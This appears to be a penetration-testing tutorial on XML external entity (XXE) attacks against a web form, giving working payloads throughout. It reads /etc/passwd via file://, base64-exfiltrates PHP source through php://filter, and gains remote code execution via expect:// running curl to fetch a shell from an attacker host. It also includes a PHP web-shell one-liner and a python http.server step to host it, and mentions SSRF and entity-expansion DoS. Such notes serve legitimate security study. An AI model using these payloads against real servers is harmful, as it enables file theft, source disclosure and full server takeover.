# Local File Disclosure

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. By defining external entities that reference local files, we can read sensitive file contents from the back-end server.

## Identifying XXE Vulnerabilities

### Finding XML Input Points

The first step is locating web pages that accept XML user input. Look for forms and intercept their requests:

```
POST /submitDetails.php HTTP/1.1
Content-Type: application/xml

<root>
    <name>John</name>
    <tel>1234567890</tel>
    <email>john@example.com</email>
    <message>Test</message>
</root>
```

### Testing Entity Injection

Define a custom internal entity to verify XML processing:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company "Inlane Freight">
]>
<root>
    <email>&company;</email>
</root>
```

If the response displays "Inlane Freight" instead of "&company;", the application is vulnerable to XXE.

## Reading Sensitive Files

Once XXE is confirmed, define external entities to read local files:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
    <email>&company;</email>
</root>
```

This retrieves the contents of `/etc/passwd` and displays them in the response.

## Reading Source Code

For non-XML files (like PHP), use PHP filters to base64 encode the content:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Decode the base64 output to view the source code.

## Remote Code Execution

### Using expect:// Filter

If the `expect` module is enabled on PHP:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

Note: Replace spaces with `$IFS`, and avoid special characters like `|`, `>`, `{`.

### Web Shell Method

1. Create a web shell: `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`
2. Host it: `python3 -m http.server 80`
3. Execute curl to fetch it from the target

## Other XXE Attacks

- **SSRF**: Enumerate internal ports and access restricted pages
- **DoS**: Use recursive entity definitions to exhaust server memory (less effective on modern servers)
